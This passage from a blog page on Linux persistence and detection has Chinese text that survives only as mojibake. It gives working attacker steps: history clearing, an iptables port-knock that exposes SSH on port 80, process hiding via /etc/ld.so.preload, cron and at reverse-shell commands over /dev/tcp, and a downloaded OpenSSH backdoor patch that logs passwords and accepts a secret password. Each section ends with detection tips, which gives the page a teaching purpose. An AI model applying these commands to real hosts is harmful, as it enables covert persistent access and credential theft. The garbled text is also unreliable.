Psï¼šå‘½ä»¤å‰åŠ ç©ºæ ¼ï¼Œå‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½•ã€‚  
2.æ¸…é™¤å†å²è®°å½•  
æŸ¥çœ‹å†å²è®°å½•ï¼š#history  
å†å²è®°å½•ä¿å­˜çš„ä½ç½®ï¼š#cat /root/.bash_history  
### ç«¯å£éšè—  
**é€šè¿‡ç«¯å£å¤ç”¨æ¥éšè—ç«¯å£**  
#### 1.SSLH  
å®‰è£…SSLH  
 sudo apt-get install sslh  
é…ç½®SSLH
 ç¼–è¾‘ SSLH é…ç½®æ–‡ä»¶ï¼š  
 sudo vi /etc/default/sslh  

 æ‰¾åˆ°ä¸‹åˆ—è¡Œï¼šRun=no  å°†å…¶ä¿®æ”¹ä¸ºï¼šRun=yes  
 ä¿®æ”¹ä»¥ä¸‹è¡Œä»¥å…è®¸ SSLH åœ¨æ‰€æœ‰å¯ç”¨æ¥å£ä¸Šä¾¦å¬ç«¯å£ 443  
 DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;  
**å®‰å…¨æ£€æµ‹**

ps -ef | grep sslh æŸ¥çœ‹ç«¯å£
#### 2.iptables
ç«¯å£å¤ç”¨é“¾  
iptables -t nat -N LETMEIN  
ç«¯å£å¤ç”¨è§„åˆ™  
iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22  
å¼€å¯å¼€å…³  
iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT  
å…³é—­å¼€å…³  
iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT  
let&#39;s do it  
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN  

**åˆ©ç”¨æ–¹å¼:**
å¼€å¯å¤ç”¨  
echo threathuntercoming | socat - tcp:192.168.28.128:80  
sshä½¿ç”¨80ç«¯å£è¿›è¡Œç™»å½•  
ssh -p 80 root@192.168.28.128  
å…³é—­å¤ç”¨  
echo threathunterleaving | socat - tcp:192.168.28.128:80  
å…·ä½“å‚è€ƒï¼š  
https://www.freebuf.com/articles/network/137683.html
### éšè—è¿›ç¨‹
**Libprocesshider**  
åˆ©ç”¨ LD_PRELOAD æ¥å®ç°ç³»ç»Ÿå‡½æ•°çš„åŠ«æŒ
ä¸‹è½½ç¨‹åºç¼–è¯‘  
git clone https://github.com/gianlucaborello/libprocesshider.git  
cd libprocesshider/ &amp;&amp; make  
ç§»åŠ¨æ–‡ä»¶åˆ°/usr/local/lib/ç›®å½•ä¸‹  
cp libprocesshider.so /usr/local/lib/  
æŠŠå®ƒåŠ è½½åˆ°å…¨å±€åŠ¨æ€è¿æ¥å±€  
echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload  

è¿è¡Œevil_script.pyæµ‹è¯•  
./evil_script.py 127.0.0.1 2333  
Topå‘½ä»¤æ— æ³•æ‰¾åˆ°evil_script.py  

**å®‰å…¨æ£€æµ‹**  
unhide æ˜¯ä¸€ä¸ªå°å·§çš„ç½‘ç»œå–è¯å·¥å…·ï¼Œèƒ½å¤Ÿå‘ç°é‚£äº›å€ŸåŠ©rootkitï¼ŒLKMåŠå…¶å®ƒæŠ€æœ¯éšè—çš„è¿›ç¨‹å’ŒTCP / UDPç«¯å£ã€‚  
å®‰è£…  
sudo yum install unhide  
ä½¿ç”¨  
unhide [options] test_list  
 ![5.1](/img/æŒä¹…åŒ–5.1.png)   

## 6.    é¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“
åŠ¨æ€é“¾æ¥åº“é¢„åŠ è½½æœºåˆ¶æ˜¯ç³»ç»Ÿæä¾›ç»™ç”¨æˆ·è¿è¡Œè‡ªå®šä¹‰åŠ¨æ€é“¾æ¥åº“çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨å¯æ‰§è¡Œç¨‹åºè¿è¡Œä¹‹å‰å°±ä¼šé¢„å…ˆåŠ è½½ç”¨æˆ·å®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“çš„ä¸€ç§æŠ€æœ¯ï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥é‡å†™ç³»ç»Ÿçš„åº“å‡½æ•°ï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥ç”¨æ¥é‡å†™ç³»ç»Ÿä¸­æœ‰æ¼æ´çš„åº“å‡½æ•°ï¼Œè¾¾åˆ°ä¿®å¤æ¼æ´çš„ç›®çš„ï¼Œä½†ä¹Ÿå¯ä»¥è¢«ç”¨æ¥åŠ«æŒã€‚ 
 ![6.1](/img/æŒä¹…åŒ–6.1.png)    

LD_PRELOAD ï¼ˆç”¨äºé¢„åŠ è½½çš„ç¯å¢ƒå˜é‡ï¼‰  
LD_PRELOADç¯å¢ƒå˜é‡æ˜¯ä¼šåŠæ—¶ç”Ÿæ•ˆçš„  
LD_PRELOAD=/lib/evil.so #LD_PRELOADçš„å€¼è®¾ç½®ä¸ºè¦é¢„åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“  
export LD_PRELOAD        #å¯¼å‡ºç¯å¢ƒå˜é‡ä½¿è¯¥ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ  
unset LD_PRELOAD         #è§£é™¤è®¾ç½®çš„LD_PRELOADç¯å¢ƒå˜é‡  
å¸¸ç”¨å·¥å…·ï¼šcub3 https://github.com/mempodippy/cub3  
/etc/ld.so.preload ï¼ˆç”¨äºé¢„åŠ è½½çš„é…ç½®æ–‡ä»¶ï¼‰  
å°†æ¶æ„soæ–‡ä»¶å†™å…¥/etc/ld.so.preloadå°±è¡Œ:  
echo â€œ/lib/evil.soâ€ &gt; /etc/ld.so.preload  
å¸¸ç”¨å·¥å…·ï¼šVlany  https://github.com/mempodippy/vlany  
### å®‰å…¨æ£€æµ‹
é€šè¿‡straceå‘½ä»¤å»è·Ÿè¸ªé¢„åŠ è½½çš„æ–‡ä»¶æ˜¯å¦ä¸º/etc/ld.so.preloadï¼Œä»¥åŠæ–‡ä»¶ä¸­æ˜¯å¦æœ‰å¼‚å¸¸çš„åŠ¨æ€é“¾æ¥åº“,æ–‡ä»¶å®Œæ•´æ€§æ ¡éªŒã€‚ä»¥åŠæ£€æŸ¥æ˜¯å¦è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡(echo $LD_PRELOAD)ç­‰ã€‚

## 7.    æœ¬åœ°ä½œä¸šè°ƒåº¦
æœ¬åœ°ä½œä¸šè°ƒåº¦å°±æ˜¯å¸¸è¯´çš„è®¡åˆ’ä»»åŠ¡
### cron
é€šè¿‡ä¿®æ”¹/etc/crontabï¼Œ/etc/cron.d/ç›®å½•æˆ– Cron å®ˆæŠ¤è¿›ç¨‹æ”¯æŒçš„å…¶ä»–ä½ç½®å¯ä»¥å®‰è£…ç³»ç»Ÿçº§çš„ cron ä½œä¸šã€‚è€Œæ¯ä¸ªç”¨æˆ·çš„ Cron ä½œä¸šæ˜¯é€šè¿‡ crontab ä½¿ç”¨å…·æœ‰ç‰¹å®šæ ¼å¼çš„ crontab æ–‡ä»¶å®‰è£…çš„ã€‚Â­å®ƒåœ¨ macOS å’Œ Linux ç³»ç»Ÿä¸Šéƒ½æœ‰æ•ˆã€‚  
è¿™äº›æ–¹æ³•å…è®¸åœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹åœ¨åå°ä»¥ç‰¹å®šçš„å‘¨æœŸé—´éš”æ‰§è¡Œå‘½ä»¤æˆ–è„šæœ¬ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ä½œä¸šè°ƒåº¦åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œç¨‹åºæˆ–ä¸ºäº†æŒä¹…æ€§è€Œåœ¨é¢„å®šçš„åŸºç¡€ä¸Šæ‰§è¡Œç¨‹åºï¼Œ ä½œä¸ºæ¨ªå‘ç§»åŠ¨çš„ä¸€éƒ¨åˆ†æ‰§è¡Œï¼Œè·å– root æƒé™ï¼Œæˆ–è€…åœ¨ç‰¹å®šå¸æˆ·çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œè¿›ç¨‹ã€‚  

é¶æœºä¸Šè®¾å®šè®¡åˆ’ä»»åŠ¡ï¼š  
(crontab -l;echo &#39;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#39;)|crontab -  

1åˆ†é’Ÿåæ”»å‡»æœºä¸ŠæˆåŠŸç›‘å¬ï¼š  

### at
at ç¨‹åºæ˜¯å¦ä¸€ç§æ–¹å¼ï¼ŒåŸºäº POSIX çš„ç³»ç»Ÿï¼ˆåŒ…æ‹¬ macOS å’Œ Linux)ã€‚ç”¨äºå°†ç¨‹åºæˆ–è„šæœ¬ä½œä¸šå®‰æ’åœ¨ä¹‹åçš„æ—¥æœŸå’Œ/æˆ–æ—¶é—´æ‰§è¡Œçš„ä¸€æ¬¡æ€§ä»»åŠ¡(cronå¤šæ¬¡)ã€‚   
[root@localhost ~]# date             # æŸ¥çœ‹å½“å‰æ—¶é—´  
[root@localhost ~]# at 00:27        # åˆ›å»ºatè®¡åˆ’ä»»åŠ¡  +  æ—¶é—´  
at&gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1                    # åœ¨08ï¼š26  bashå‘½ä»¤åå¼¹shell  
at&gt; \&lt;EOT&gt;                            # Ctrl+D  ç»“æŸ    

8ï¼š26æ”»å‡»æœºä¸ŠæˆåŠŸç›‘å¬

### å®‰å…¨æ£€æµ‹
ä¸€èˆ¬é€šè¿‡crontab -lï¼ˆat -lç­‰ï¼‰å‘½ä»¤å³å¯æ£€æµ‹åˆ°å®šæ—¶ä»»åŠ¡åé—¨ã€‚ä¸åŒçš„linuxå‘è¡Œç‰ˆå¯èƒ½æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹çš„æ–‡ä»¶ä¸å¤§ç›¸åŒï¼ŒDebianç³»linuxç³»ç»Ÿä¸€èˆ¬æ˜¯é€šè¿‡æŸ¥çœ‹/etc/init.dç›®å½•æœ‰æ— æœ€è¿‘ä¿®æ”¹å’Œå¼‚å¸¸çš„å¼€æœºå¯åŠ¨é¡¹ã€‚è€ŒRedhatç³»çš„linuxç³»ç»Ÿä¸€èˆ¬æ˜¯æŸ¥çœ‹/etc/rc.d/init.dæˆ–è€…/etc/systemd/systemç­‰ç›®å½•ã€‚
## 8.    Openssh
é€šè¿‡åœ¨opensshæºç ä¸­æ’å…¥æ¶æ„ä»£ç å¹¶è¿›è¡Œé‡æ–°ç¼–è¯‘æ¥æ›¿æ¢åŸæœ‰sshdæ–‡ä»¶ã€‚æ’å…¥çš„æ¶æ„ä»£ç å¯ä»¥æ˜¯å°†ç™»å½•æˆåŠŸçš„ç”¨æˆ·å¯†ç å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨æˆ–è€…è®°å½•åˆ°æŸä¸ªlogæ–‡ä»¶ä¸­ã€‚åœ¨opensshç›®å½•ä¸­æ‰¾åˆ°includes.hæ–‡ä»¶ã€‚
å®‰è£…åé—¨  
ç¯å¢ƒï¼šcentos6.9  
ä¸‹è½½openssh-5.9p1.tar.gz  
wget http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz  
ä¸‹è½½åé—¨æ–‡ä»¶  
wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz  
è§£å‹  
&gt;tar zxvf openssh-5.9p1.tar.gz  
tar zxvf openssh-5.9p1.patch.tar.gz    

å¤åˆ¶patchåé—¨æ–‡ä»¶åˆ°æ­£å¸¸opensshé‡Œé¢  
&gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1  
patch &lt; sshbd5.9p1.diff  
 ![8.1](/img/æŒä¹…åŒ–8.1.png)     

ä¿®æ”¹åé—¨å¯†ç å’Œæ–‡ä»¶è®°å½• vim includes.h
&gt;int secret_ok;  
FILE *f;  
#define ILOG &quot;/tmp/ilog&quot;  # è®°å½•ç™»å½•åˆ°æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç   
#define OLOG &quot;/tmp/olog&quot;  # è®°å½•æœ¬æœºç™»å½•åˆ°è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç   
#define SECRETPW &quot;test&quot; # è¿œç¨‹è¿æ¥å¯†ç   
#endif /* INCLUDES_H */    

ç¼–è¯‘å®‰è£…  
&gt;yum install -y openssl openssl-devel pam-devel zlib zlib-devel  
./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5  
make clean  
make &amp;&amp; make install  
service sshd start ï¼ˆcentos7ï¼šsystemctl restart sshd.serviceï¼‰  

æ”»å‡»æœºè¿æ¥åé—¨
![8.2](/img/æŒä¹…åŒ–8.2.png)     
### å®‰å…¨æ£€æµ‹
1ã€æŸ¥çœ‹Opensshç‰ˆæœ¬  
ssh -V  
2ã€æŸ¥çœ‹sshé…ç½®æ–‡ä»¶å’Œ/usr/sbin/sshdçš„æ—¶é—´  
stat /usr/sbin/sshd  
#æ—¶é—´å’Œç‰ˆæœ¬éƒ½æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œæ‰€ä»¥ä¸é è°±  
3ã€æŸ¥çœ‹æ—¥å¿—  
more /var/log/secure | grep &quot;Accepted&quot; | awk &#39;{print $11}&#39; | uniq  
4ã€é€šè¿‡straceç›‘æ§sshdè¿›ç¨‹è¯»å†™æ–‡ä»¶çš„æ“ä½œ  
ps axu | grep sshd | grep -v grep #sshdçˆ¶è¿›ç¨‹ID  
strace -o sshd -ff -p 2908  
grep open sshd* | grep -v -e No -e null -e denied| grep WR  
5ã€ä¸€èˆ¬çš„opensshåé—¨éƒ½ä¼šå°†è´¦æˆ·å¯†ç è®°å½•åˆ°æ–‡ä»¶æˆ–è€…å‘é€åˆ°é‚®ç®±ä¸­  
strings /usr/sbin/sshd |grep &#39;[1-9]{1,3}.[1-9]{1,3}.&#39;  
strings /usr/sbin/sshd |grep &#39;@&#39;  


</code></pre>
            <hr>
          </div>
          <br>
          <div>
            <p>
            
              
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">å†…ç½‘</a>
                
              </span>
            
            </p>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container">
        <div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;ç›®å½•</p>
  <div id="tocbot"></div>
</div>
      </div>
    
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
      <br><br>
      
      
  <script defer src="https://utteranc.es/client.js"
          repo="huuuz/huuuz.github.io"
          issue-term="title"
  
          label="utterances"
    
          theme="github-light"
          crossorigin="anonymous"
          async>
  </script>


    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>

    
  <div>
    
      <!-- ä¸è’œå­ç»Ÿè®¡PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      æ€»è®¿é—®é‡ <span id="busuanzi_value_site_pv"></span> æ¬¡
    </span>
    
    
      <!-- ä¸è’œå­ç»Ÿè®¡UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      æ€»è®¿å®¢æ•° <span id="busuanzi_value_site_uv"></span> äºº
    </span>
    
  </div>


    

    <!-- cnzz Analytics icon -->
    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var main = $('main');
      var tocT = navHeight + (toc.offset().top - main.offset().top);
      var tocLimMin = main.offset().top - navHeight;
      var tocLimMax = $('#comments').offset().top - navHeight;
      $(window).scroll(function () {
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': tocT,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
    });
  </script>







  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "linuxæŒä¹…åŒ–åŠå®‰å…¨æ£€æµ‹&nbsp;",
      ],
      cursorChar: "ğŸ¶",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
